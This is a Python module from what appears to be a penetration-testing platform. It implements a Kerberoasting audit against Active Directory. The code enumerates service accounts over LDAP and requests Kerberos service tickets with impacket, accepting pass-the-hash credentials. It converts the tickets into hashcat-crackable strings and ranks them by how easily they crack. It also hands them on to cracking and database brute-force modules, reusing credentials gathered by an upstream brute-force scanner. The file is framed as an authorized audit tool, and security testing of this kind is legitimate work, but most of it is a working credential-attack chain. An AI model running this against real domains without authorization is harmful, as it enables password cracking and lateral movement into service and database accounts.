"""kerberoast_audit - Kerberoasting (MITRE T1558.003) via VL-METHOD.

Phase C Active Directory differentiator. Built 2026-06-05 on the
VL-METHOD 7-step pentest pattern (modeled on hydra_ssh_spray.py and
ldap_brute.py).

What Kerberoasting is, in one paragraph
---------------------------------------
Any authenticated domain user can ask the KDC for a Ticket-Granting
Service (TGS) for any registered Service Principal Name (SPN). The
TGS-REP is encrypted with the SPN owner's NTLM hash (RC4-HMAC by
default, AES if the account opted in). Because the KDC issues these
without checking whether the requester actually intends to use the
service, an attacker can request TGS tickets for every user-account
SPN in the domain, then crack the encrypted portion offline. RC4
tickets crack on a single GPU at ~5000 H/s (hashcat -m 13100); AES
~50-100 H/s (hashcat -m 19700). The attack is a feature of Kerberos
RFC 4120, not a vulnerability - mitigation is enforcing strong
service-account passwords (or migrating to gMSA) and disabling RC4.

7 stages this scanner performs
------------------------------

  1. PRE-FLIGHT  - Verify required inputs present (dc_ip, domain, user,
                    and either password or nt_hash). If chain_creds
                    populated by an upstream scanner, inherit. TCP-test
                    dc_ip:88 (Kerberos). Skip if unreachable.

  2. FINGERPRINT - Bind via ldap3 to dc_ip:389, read rootDSE for
                    {domain_functional_level, forest_functional_level,
                    naming_contexts, schema_version, dns_host_name}.
                    Captures the forest posture so the PDF can show
                    "Server 2019 forest, schema 88" context.

  3. QUICK PROBE - Enumerate SPN-bearing USER accounts via LDAP
                    filter (&(samAccountType=805306368)
                    (servicePrincipalName=*)). Returns no findings yet -
                    just stashes the list for deep_scan to request.

  4. DEEP SCAN   - For each SPN account (capped at 50 to avoid log
                    flood), request a TGS via impacket
                    krb5.kerberosv5 getKerberosTGT + getKerberosTGS.
                    Convert the encrypted portion to hashcat -m 13100
                    string format. Each successful extraction = one
                    finding with the hashcat-formatted hash.

  5. VERIFY      - Validate hash format: must start with $krb5tgs$N$
                    where N is the etype int (17, 18, 23) and the
                    encrypted blob must be at least 64 hex chars.
                    CONFIRMED if format valid; SUSPECTED otherwise.

  6. PRIVILEGE   - Classify each ticket by:
                    (a) crackability - etype 23 = rc4 (fast),
                                       17/18 = aes (slower),
                                       other = unknown
                    (b) service target - MSSQLSvc/ = sql_service
                                          HTTP/ = web_service
                                          CIFS/HOST/ = file_or_host_service
                    SQL service accounts are the highest-value chain
                    because compromise = data exfil + xp_cmdshell
                    foothold.

  7. CHAIN       - All CONFIRMED tickets -> chain_next includes
                    john_hash_audit (downstream cracker that consumes
                    the hashcat-formatted strings). SQL service tickets
                    additionally chain into mysql_brute + mssql_brute
                    for the post-crack DB access test.

Customer input via ScanRequest.options
--------------------------------------
  dc_ip            - Domain Controller IP (REQUIRED)
  domain           - AD domain name, e.g. "corp.local" (REQUIRED)
  user             - any authenticated AD user (REQUIRED unless
                     chain_creds present from upstream scanner)
  password         - the user's password (one of password/nt_hash REQ)
  nt_hash          - or NT hash for pass-the-hash (alt to password)
  chain_creds      - [{user, pwd}] from upstream scanner (optional;
                     auto-populated by ChainExecutor when chained from
                     ldap_brute Domain Admins confirmation)
  always_deep      - bool, run deep_scan even if quick_probe yielded 0
                     SPN accounts (default: False)
  show_plaintext   - bool, return raw hash strings instead of redaction
                     marker (default: False - customer scanning own
                     infra should set True so cracking tools have a
                     consumable ticket string)
  max_spn          - int, hard cap on SPN tickets per scan (default 50)

Safety guard: ticket extraction is hard-capped at 50 SPN accounts per
scan to avoid filling the DC's Security log with 4769 events. The
chain handoff to john_hash_audit is where the real cracking work
happens; we just emit the tickets here.
"""
from __future__ import annotations

import asyncio
import hashlib
import re
from typing import Optional

from fastapi import APIRouter, Depends

from tools._shared import ScanRequest, verify_scan_quota
from tools._vl_core import ScanContext
from tools._methodology import MethodologyScanner, helpers
from tools._payloads.kerberoast_audit_findings import (
    KERBEROAST_AUDIT_FINDING_RULES,
    INTEL_FIELDS,
)

router = APIRouter()

# Hard caps - avoid Security log noise + container memory blowups
HARD_MAX_SPN = 50
PER_TGS_TIMEOUT = 6.0      # per-account TGS request timeout
LDAP_TIMEOUT = 6.0
KERBEROS_PORT = 88
LDAP_PORT = 389


class KerberoastAuditRequest(ScanRequest):
    options: Optional[dict] = None


def _redact(hash_str: str, show_plaintext: bool = False) -> str:
    """Customer-safe redaction for hashcat -m 13100 ticket strings.

    Default behavior returns a stable shape-marker like
        "etype23_len512_hash9a3f8e1c"
    where 9a3f8e1c is the first 8 hex chars of sha256(hash_str). This
    lets the customer report show "ticket extracted" with auditability
    (same ticket -> same marker) but no crackable material in multi-
    tenant reports.

    show_plaintext=True (customer scanning own infra) returns the raw
    hashcat string directly so they can feed it into john/hashcat."""
    if not hash_str:
        return "etype?_len0_hash?"
    if show_plaintext:
        return hash_str
    etype = "?"
    m = re.match(r"\$krb5tgs\$(\d+)\$", hash_str)
    if m:
        etype = m.group(1)
    digest = hashlib.sha256(hash_str.encode("utf-8", errors="ignore")).hexdigest()[:8]
    return f"etype{etype}_len{len(hash_str)}_hash{digest}"


def _classify_etype(etype_int: int) -> str:
    """Map Kerberos etype number to crackability tier."""
    if etype_int == 23:
        return "rc4_crackable_high_value"
    if etype_int in (17, 18):
        return "aes_crackable_lower_priority"
    return "unknown_etype"


def _classify_spn_target(spn: str) -> str:
    """Map SPN service class to target-value tier."""
    if not spn:
        return "unknown_service"
    low = spn.strip().lower()
    if low.startswith("mssqlsvc/") or "mssqlsvc/" in low:
        return "sql_service"
    if low.startswith("http/") or "http/" in low.split("/")[0] + "/":
        # Strict prefix: HTTP/, http/ at start of SPN
        return "web_service"
    if low.startswith(("cifs/", "host/")):
        return "file_or_host_service"
    return "other_service"


def _validate_hashcat_format(hash_str: str) -> tuple[bool, int]:
    """Return (is_valid, etype_int) for a hashcat -m 13100 string.

    Format: $krb5tgs$<etype>$*<user>*<realm>*<spn>*<...>$<encrypted_hex>
    Minimum: must start with $krb5tgs$N$ and have >=64 hex chars in
    the trailing encrypted portion."""
    if not hash_str or not hash_str.startswith("$krb5tgs$"):
        return (False, 0)
    m = re.match(r"\$krb5tgs\$(\d+)\$", hash_str)
    if not m:
        return (False, 0)
    try:
        etype = int(m.group(1))
    except ValueError:
        return (False, 0)
    # The encrypted hex blob is the last $-delimited field
    last_part = hash_str.rsplit("$", 1)[-1]
    hex_only = re.sub(r"[^0-9a-fA-F]", "", last_part)
    if len(hex_only) < 64:
        return (False, etype)
    return (True, etype)


# ════════════════════════════════════════════════════════════════════
#  KerberoastAudit - the VL-METHOD scanner class
# ════════════════════════════════════════════════════════════════════


class KerberoastAudit(MethodologyScanner):
    name = "kerberoast_audit"

    # ── STAGE 1: PRE-FLIGHT ──────────────────────────────────────
    async def pre_flight(self, ctx: ScanContext) -> bool:
        opts = ctx.state.get("_options") or {}
        # Inherit from chain_creds if explicit user/password absent
        chain_creds = opts.get("chain_creds") or []
        if chain_creds and not opts.get("user"):
            first = chain_creds[0] or {}
            opts["user"] = first.get("user", "")
            if not opts.get("password") and not opts.get("nt_hash"):
                opts["password"] = first.get("pwd", "")
            ctx.state["_options"] = opts  # persist back

        dc_ip = (opts.get("dc_ip") or "").strip()
        domain = (opts.get("domain") or "").strip()
        user = (opts.get("user") or "").strip()
        password = opts.get("password") or ""
        nt_hash = opts.get("nt_hash") or ""

        # Check impacket availability up-front so finding rules can
        # surface an INFO message instead of looking like "scan worked".
        try:
            import impacket  # noqa: F401
        except ImportError:
            ctx.state["impacket_missing"] = True
            ctx.state["skipped_reason"] = (
                "impacket Python library not installed - cannot perform "
                "Kerberoasting audit.")
            return False

        if not user or not (password or nt_hash) or not dc_ip or not domain:
            ctx.state["skipped_reason"] = (
                "Kerberoasting requires AD user + password/hash + dc_ip "
                "+ domain - one or more inputs missing")
            return False

        # TCP-test DC Kerberos port 88
        reachable = await helpers.port_open(dc_ip, KERBEROS_PORT, timeout=3.0)
        ctx.state["dc_kerberos_reachable"] = reachable
        if not reachable:
            ctx.state["skipped_reason"] = (
                f"DC Kerberos port {KERBEROS_PORT}/TCP on {dc_ip} not "
                "reachable (port closed or filtered)")
            return False

        ctx.state["dc_ip"] = dc_ip
        ctx.state["domain"] = domain
        ctx.state["bind_user"] = user
        return True

    # ── STAGE 2: FINGERPRINT ─────────────────────────────────────
    async def fingerprint(self, ctx: ScanContext):
        try:
            import ldap3
        except ImportError:
            ctx.state["fingerprint"] = {"error": "ldap3 not installed"}
            ctx.state["bind_failed"] = True
            return
        opts = ctx.state.get("_options") or {}
        dc_ip = ctx.state.get("dc_ip") or ""
        user = ctx.state.get("bind_user") or ""
        password = opts.get("password") or ""
        domain = ctx.state.get("domain") or ""
        loop = asyncio.get_event_loop()

        # Prefer UPN bind format user@domain for AD compatibility
        bind_user = user if "@" in user or "\\" in user else f"{user}@{domain}"

        def _read_root_dse():
            fp = {
                "domain_functional_level": "",
                "forest_functional_level": "",
                "naming_contexts": [],
                "schema_version": "",
                "dns_host_name": "",
                "error": "",
            }
            try:
                server = ldap3.Server(dc_ip, port=LDAP_PORT,
                                       get_info=ldap3.ALL,
                                       connect_timeout=4)
                conn = ldap3.Connection(server, user=bind_user,
                                         password=password,
                                         auto_bind=False, read_only=True,
                                         receive_timeout=LDAP_TIMEOUT)
                bound = False
                try:
                    bound = bool(conn.bind())
                except Exception as e:
                    fp["error"] = f"bind: {type(e).__name__}"
                if not bound:
                    fp["error"] = fp["error"] or "bind returned false"
                    return (fp, False)
                info = getattr(server, "info", None)
                if info is not None:
                    try:
                        nc = getattr(info, "naming_contexts", None) or []
                        fp["naming_contexts"] = [str(x) for x in nc][:8]
                    except Exception: pass
                    # rootDSE custom attributes (AD-specific)
                    try:
                        other = getattr(info, "other", None) or {}
                        # 'domainFunctionality', 'forestFunctionality',
                        # 'dnsHostName' live here on AD
                        for key, dest in (
                            ("domainFunctionality", "domain_functional_level"),
                            ("forestFunctionality", "forest_functional_level"),
                            ("dnsHostName", "dns_host_name"),
                        ):
                            v = other.get(key)
                            if v:
                                fp[dest] = str(v[0] if isinstance(v, list) and v else v)
                    except Exception: pass
                    # Schema version via schema_naming_context lookup
                    try:
                        snc = getattr(info, "schema_naming_context", None) or ""
                        fp["schema_version"] = str(snc)[:200]
                    except Exception: pass
                try: conn.unbind()
                except Exception: pass
                return (fp, True)
            except Exception as e:
                fp["error"] = f"server: {type(e).__name__}: {str(e)[:120]}"
                return (fp, False)

        try:
            fp, bound = await asyncio.wait_for(
                loop.run_in_executor(None, _read_root_dse), timeout=10.0)
        except asyncio.TimeoutError:
            fp = {"error": "rootDSE bind timed out"}
            bound = False
        except Exception as e:
            fp = {"error": f"fingerprint exc: {type(e).__name__}"}
            bound = False

        ctx.state["fingerprint"] = fp
        if not bound:
            ctx.state["bind_failed"] = True

    # ── STAGE 3: QUICK PROBE (LDAP enumerate SPN accounts) ───────
    async def quick_probe(self, ctx: ScanContext) -> list[dict]:
        if ctx.state.get("bind_failed"):
            ctx.state["spn_accounts_count"] = 0
            ctx.state["quick_probe_attempts"] = 1
            ctx.state["quick_probe_hits"] = 0
            return []
        try:
            import ldap3
        except ImportError:
            ctx.state["spn_accounts_count"] = 0
            return []

        opts = ctx.state.get("_options") or {}
        dc_ip = ctx.state.get("dc_ip") or ""
        user = ctx.state.get("bind_user") or ""
        password = opts.get("password") or ""
        domain = ctx.state.get("domain") or ""
        fp = ctx.state.get("fingerprint") or {}
        # Use first naming_context as the search base (root domain NC)
        ncs = fp.get("naming_contexts") or []
        # Build base_dn from domain if rootDSE didn't yield one
        if ncs:
            base_dn = ncs[0]
        else:
            base_dn = ",".join(f"dc={p}" for p in domain.split(".") if p)

        bind_user = user if "@" in user or "\\" in user else f"{user}@{domain}"
        loop = asyncio.get_event_loop()

        def _enum_spns():
            try:
                server = ldap3.Server(dc_ip, port=LDAP_PORT,
                                       get_info=ldap3.NONE,
                                       connect_timeout=4)
                conn = ldap3.Connection(server, user=bind_user,
                                         password=password,
                                         auto_bind=False, read_only=True,
                                         receive_timeout=LDAP_TIMEOUT)
                if not conn.bind():
                    return []
                # AD-specific filter: user objects (samAccountType
                # 805306368 = SAM_NORMAL_USER_ACCOUNT) WITH at least
                # one SPN registered. Machine accounts ($-suffixed)
                # have samAccountType 805306369 and are excluded.
                accounts: list[tuple[str, str]] = []
                try:
                    ok = conn.search(
                        search_base=base_dn,
                        search_filter=("(&(samAccountType=805306368)"
                                        "(servicePrincipalName=*))"),
                        search_scope=ldap3.SUBTREE,
                        attributes=["sAMAccountName", "servicePrincipalName"],
                        size_limit=HARD_MAX_SPN * 4,  # buffer for multi-SPN
                    )
                    if ok and conn.entries:
                        for entry in conn.entries:
                            try:
                                sam = str(entry.sAMAccountName)
                            except Exception:
                                continue
                            spns = []
                            try:
                                spn_attr = entry.servicePrincipalName
                                spns = list(spn_attr.values) if hasattr(spn_attr, "values") else list(spn_attr)
                            except Exception:
                                pass
                            # Pick the first SPN as the canonical (one
                            # finding per user account; SQL/HTTP/CIFS
                            # often share a user account)
                            spn = str(spns[0]) if spns else ""
                            if sam and spn:
                                accounts.append((sam, spn))
                            if len(accounts) >= HARD_MAX_SPN:
                                break
                except Exception:
                    pass
                try: conn.unbind()
                except Exception: pass
                return accounts
            except Exception:
                return []

        try:
            accounts = await asyncio.wait_for(
                loop.run_in_executor(None, _enum_spns), timeout=LDAP_TIMEOUT + 8.0)
        except asyncio.TimeoutError:
            accounts = []
        except Exception:
            accounts = []

        ctx.state["spn_accounts"] = accounts
        ctx.state["spn_accounts_count"] = len(accounts)
        ctx.state["quick_probe_attempts"] = 1
        ctx.state["quick_probe_hits"] = len(accounts)
        # Return empty findings - actual TGS extraction happens in
        # deep_scan, where we have a separate hit count
        return []

    # ── STAGE 4: DEEP SCAN (request TGS per SPN account) ─────────
    async def deep_scan(self, ctx: ScanContext) -> list[dict]:
        opts = ctx.state.get("_options") or {}
        # Gate: quick_probe_hits > 0 OR always_deep override
        if (ctx.state.get("quick_probe_hits", 0) <= 0
                and not opts.get("always_deep")):
            return []
        if ctx.state.get("bind_failed"):
            return []
        if ctx.state.get("impacket_missing"):
            return []

        try:
            from impacket.krb5.kerberosv5 import (
                getKerberosTGT,
                getKerberosTGS,
            )
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
        except ImportError:
            ctx.state["impacket_missing"] = True
            return []

        dc_ip = ctx.state.get("dc_ip") or ""
        domain = (ctx.state.get("domain") or "").upper()
        user = (ctx.state.get("bind_user") or "").split("@")[0].split("\\")[-1]
        password = opts.get("password") or ""
        nt_hash_hex = (opts.get("nt_hash") or "").strip()
        accounts = ctx.state.get("spn_accounts") or []
        max_spn = min(int(opts.get("max_spn") or HARD_MAX_SPN), HARD_MAX_SPN)
        show_plaintext = bool(opts.get("show_plaintext"))

        # Build LM/NT hash pair for impacket if pass-the-hash supplied
        lm_hash_arg = ""
        nt_hash_arg = ""
        if nt_hash_hex:
            # Accept "LM:NT" or just "NT"
            if ":" in nt_hash_hex:
                lm_hash_arg, nt_hash_arg = nt_hash_hex.split(":", 1)
            else:
                lm_hash_arg = "aad3b435b51404eeaad3b435b51404ee"  # empty LM
                nt_hash_arg = nt_hash_hex

        loop = asyncio.get_event_loop()

        def _get_tgt():
            try:
                user_principal = Principal(
                    user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    user_principal, password, domain,
                    lm_hash_arg, nt_hash_arg, None, dc_ip)
                return (tgt, cipher, sessionKey, None)
            except Exception as e:
                return (None, None, None,
                        f"{type(e).__name__}: {str(e)[:180]}")

        try:
            tgt, cipher, sessionKey, err = await asyncio.wait_for(
                loop.run_in_executor(None, _get_tgt),
                timeout=PER_TGS_TIMEOUT + 6.0)
        except asyncio.TimeoutError:
            ctx.state["tgt_error"] = "TGT request timed out"
            return []
        except Exception as e:
            ctx.state["tgt_error"] = f"{type(e).__name__}: {str(e)[:180]}"
            return []

        if not tgt:
            ctx.state["tgt_error"] = err or "TGT acquisition failed"
            return []

        # For each SPN account, request a TGS via getKerberosTGS,
        # extract the encrypted portion, and format as hashcat -m 13100.
        findings: list[dict] = []
        tickets_extracted = 0

        def _get_tgs_for(spn_str: str, spn_account: str):
            try:
                server_principal = Principal(
                    spn_str,
                    type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
                tgs, t_cipher, t_oldKey, t_sessionKey = getKerberosTGS(
                    server_principal, domain, dc_ip, tgt, cipher, sessionKey)
                # Decode the TGS into hashcat -m 13100 format.
                # The ticket is an ASN.1 KRB-TGS-REP; we extract the
                # encrypted ticket's etype + cipher.
                # Build hashcat string per impacket's GetUserSPNs.py
                # output convention.
                from impacket.krb5.asn1 import TGS_REP
                from pyasn1.codec.der import decoder
                decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                etype = int(decoded_tgs['ticket']['enc-part']['etype'])
                cipher_bytes = bytes(decoded_tgs['ticket']['enc-part']['cipher'])
                hex_blob = cipher_bytes.hex()
                # hashcat -m 13100 reference format:
                #   $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<chk16>$<rest>
                # For etype 23 (RC4): first 16 bytes of cipher = checksum,
                #                     remainder = encrypted data.
                # For etype 17/18 (AES): different layout - simplified
                #                        single-blob form below is what
                #                        hashcat accepts.
                if etype == 23 and len(hex_blob) >= 32:
                    chk = hex_blob[:32]
                    rest = hex_blob[32:]
                    hashcat = (f"$krb5tgs$23$*{spn_account}${domain}$"
                               f"{spn_str}*${chk}${rest}")
                else:
                    hashcat = (f"$krb5tgs${etype}$*{spn_account}${domain}$"
                               f"{spn_str}*${hex_blob}")
                return (hashcat, etype, None)
            except Exception as e:
                return (None, 0, f"{type(e).__name__}: {str(e)[:180]}")

        for idx, (spn_account, spn_str) in enumerate(accounts[:max_spn]):
            if tickets_extracted >= max_spn:
                break
            try:
                result = await asyncio.wait_for(
                    loop.run_in_executor(None, _get_tgs_for, spn_str, spn_account),
                    timeout=PER_TGS_TIMEOUT + 4.0)
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue
            hashcat, etype, err = result
            if not hashcat:
                continue
            tickets_extracted += 1
            findings.append({
                "id": f"tgs_{idx}",
                "kind": "kerberoast_tgs",
                "spn_account": spn_account,
                "spn": spn_str,
                "ticket_hash_hashcat": _redact(hashcat, show_plaintext=show_plaintext),
                "hash_encryption_type": etype,
                "discovery_method": "impacket_getuserspns",
                "_hash_private": hashcat,  # stripped before response
            })

        ctx.state["kerberoast_tgs_count"] = tickets_extracted
        return findings

    # ── STAGE 5: VERIFY (validate hashcat format) ────────────────
    async def verify(self, ctx: ScanContext, finding: dict) -> Optional[dict]:
        raw = finding.get("_hash_private") or ""
        valid, etype = _validate_hashcat_format(raw)
        if valid:
            finding["confidence"] = "CONFIRMED"
            finding["verification_method"] = "hashcat_format_13100_validated"
        else:
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "hash_format_check_failed"
        # Keep etype consistent with what verify saw
        if etype and not finding.get("hash_encryption_type"):
            finding["hash_encryption_type"] = etype
        return finding

    # ── STAGE 6: PRIVILEGE CHECK (etype + service target tier) ───
    async def privilege_check(self, ctx: ScanContext, finding: dict) -> dict:
        etype = int(finding.get("hash_encryption_type") or 0)
        finding["privilege"] = _classify_etype(etype)
        finding["privilege_target"] = _classify_spn_target(
            finding.get("spn") or "")
        return finding

    # ── STAGE 7: CHAIN HANDOFF ───────────────────────────────────
    async def chain_handoff(self, ctx: ScanContext, findings: list[dict]) -> list[str]:
        confirmed = [f for f in findings if f.get("confidence") == "CONFIRMED"]
        if not confirmed:
            return []
        next_scanners: list[str] = ["john_hash_audit"]
        # If any ticket targets SQL service, add db brute-force scanners
        # so post-crack DB access is tested automatically.
        if any(f.get("privilege_target") == "sql_service" for f in confirmed):
            for s in ("mssql_brute", "mysql_brute"):
                if s not in next_scanners:
                    next_scanners.append(s)
        # Per-finding chain_next stamp (so ChainExecutor sees the link)
        for f in confirmed:
            f["chain_next"] = list(next_scanners)
        return next_scanners


# ════════════════════════════════════════════════════════════════════
#  Endpoint wrapper
# ════════════════════════════════════════════════════════════════════


@router.post("/api/password/kerberoast_audit")
async def password_kerberoast_audit(req: KerberoastAuditRequest,
                                     _=Depends(verify_scan_quota)):
    scanner = KerberoastAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=KERBEROAST_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


def register(app):
    app.include_router(router)


# ════════════════════════════════════════════════════════════════════
#  Chain registry registration - upstream scanners (ldap_brute admin
#  confirmation, AD enumeration) trigger us via _chain_callable.
# ════════════════════════════════════════════════════════════════════


async def _chain_callable(target: str, options: dict, jwt=None) -> dict:
    """ChainExecutor entry point - upstream scanners (ldap_brute admin
    confirmation, AD enumeration scanners) trigger us via this wrapper."""
    opts = options or {}
    # Inherit chain_creds into user/password if not already set
    if not opts.get("user") and (opts.get("chain_creds") or []):
        cred = opts["chain_creds"][0]
        opts["user"] = cred.get("user", "")
        opts["password"] = cred.get("pwd", "")
    # If target looks like an AD host but dc_ip wasn't supplied, use
    # target as dc_ip (ldap_brute would have targeted the DC anyway)
    if not opts.get("dc_ip"):
        opts["dc_ip"] = target
    req = KerberoastAuditRequest(target=target, options=opts)
    scanner = KerberoastAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=KERBEROAST_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


from tools._methodology import chain_registry
chain_registry.register("kerberoast_audit", _chain_callable)
